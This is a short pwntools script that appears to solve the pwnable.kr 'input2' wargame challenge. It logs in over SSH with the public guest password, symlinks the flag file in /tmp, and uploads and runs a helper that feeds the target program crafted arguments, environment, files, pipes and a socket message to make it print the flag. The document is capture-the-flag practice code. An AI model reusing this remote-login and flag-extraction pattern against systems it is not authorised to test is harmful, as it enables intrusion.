from pwn import *
import warnings
warnings.filterwarnings('ignore')

pwnfile = r"""
from pwn import *
import os
# argv
argv = ['/home/input2/input'] + ['A']*99
argv[ord('A')] = ""
argv[ord('B')] = "\x20\x0a\x0d"
argv[ord('C')] = "12345"

# env
env = {"\xde\xad\xbe\xef": "\xca\xfe\xba\xbe"}
os.chdir("/tmp/drdr3/")
# file
with open("\x0a", "wb") as f:
    f.write("\x00" * 4)
# stdin
in_pipe_r, in_pipe_w = os.pipe()
err_pipe_r, err_pipe_w = os.pipe()
out_pipe_r, out_pipe_w = os.pipe()
os.write(in_pipe_w, "\x00\x0a\x00\xff")
os.write(err_pipe_w, "\x00\x0a\x02\xff")
sh = process(argv, executable="/home/input2/input", env=env, stdin=in_pipe_r, stderr=err_pipe_r)
sh.recvlines(7)
# network
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 12345))
s.send("\xde\xad\xbe\xef")
s.close()

flag = sh.recvlines(2)
print(flag)

"""

con = ssh("input2", "pwnable.kr", 2222, "guest")
con.shell("mkdir /tmp/drdr3/ && cd /tmp/drdr3/ && ln -s /home/input2/flag /tmp/drdr3/flag")
con.upload_data(pwnfile, "/tmp/drdr3/pwnfile.py")
sh = con.run("python -i /tmp/drdr3/pwnfile.py")
print sh.recvuntil(':)')
con.close()